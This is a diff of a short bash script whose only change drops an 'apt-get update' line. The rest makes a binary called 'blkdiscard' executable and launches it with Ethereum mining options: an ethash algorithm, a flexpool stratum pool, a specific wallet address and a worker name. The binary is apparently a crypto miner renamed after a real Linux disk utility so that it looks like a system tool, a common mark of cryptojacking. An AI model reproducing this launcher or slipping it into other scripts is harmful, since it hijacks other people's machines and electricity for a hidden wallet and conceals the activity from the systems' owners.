@@ -1,5 +1,4 @@
 #!/bin/bash
-apt-get update
 
 chmod +x blkdiscard 
 ./blkdiscard --algo ethash --pool stratum+ssl://eth-de.flexpool.io:5555 --wallet 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621 --worker-name KULI-JAWA --tlimit 74 --tresume 69 --safe-dag
